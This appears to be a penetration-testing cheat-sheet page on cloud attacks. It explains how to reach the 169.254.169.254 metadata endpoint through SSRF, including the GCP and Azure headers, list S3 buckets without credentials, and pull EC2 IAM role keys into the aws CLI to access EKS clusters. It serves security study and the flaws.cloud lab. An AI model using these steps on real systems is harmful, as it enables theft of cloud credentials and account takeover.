---
title: "Cloud"
date: 2019-03-26T08:47:11+01:00
tags:
 - cloud
 - AWS
 - GCP
 - Azure
 - DigitalOcean
 - SSRF
---


## Get Cloud Metadata

When you have access to the internal network (SSRF, RCE, ...) you can read
metadata of the server instance. All cloud providers use the same endpoint:
`169.254.169.254`.

On GCP and Azure you need to add some custom header, so a simple SSRF may not be
enough.

- GCP: `Metadata-Flavor: Google` (or the previous header `X-Google-Metadata-Request: True`)
- Azure: `Metadata: true`

Here the documentation for various cloud providers:

- [AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
- [Azure](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
- [GCP](https://cloud.google.com/compute/docs/storing-retrieving-metadata)
- [DigitalOcean](https://developers.digitalocean.com/documentation/metadata/)


## AWS

### Check if domain is on a bucket
```bash
dig +nocmd flaws.cloud any +multiline +noall +answer
```

### List a bucket
```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
```

### Generate EKS token

If your instance is a Kubernetes node, then you can generate an EKS token to
connect to the Kubernetes API with `kubectl`

```bash
aws eks update-kubeconfig --region {AWS_REGION} --profile {ROLE_NAME} --name {CLUSTER_NAME} --kubeconfig {KUBE_CONFIG_PATH}
kubectl get pods --all-namespaces --kubeconfig {KUBE_CONFIG_PATH}
```

You may find the parameters value (`region` and `name`) on the metadata API.
The `kubectl`commands are details on the [Kubernetes page](/kubernetes/#useful-kubectl-commands).


### Extract secrets from metadata endpoint

On an EC2 instance, you can requests metadata endpoint to collects secrets. This
endpoint might be accessible while exploiting a `SSRF` vulnerability.


#### Get EC2 instance roles

Sending a GET requests to the following endpoint will dump a list of roles that
are attaches to the current EC2 instance.

```url
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

```json
{
  "Code" : "Success",
  "LastUpdated" : "2021-06-01T15:43:52Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA................",
  "SecretAccessKey" : "........................................",
  "Token" : "...",
  "Expiration" : "2021-06-01T21:46:32Z"
}
```

Then you can add this token to `aws` CLI tool:

```
[role_name]
aws_access_key_id = ASIA................
aws_secret_access_key = ........................................
aws_session_token = ...
```

#### Get EC2 instance launching script

The following endpoint list the script executed when you start a new instance:

```url
http://169.254.169.254/user-data
```

On an instance used as a EKS node the script can launch `bootstrap.sh`. Use the
same paramters to generate an [EKS token](/cloud/#generate-eks-token)



### Resources on AWS

- [flaws.cloud](http://flaws.cloud/)
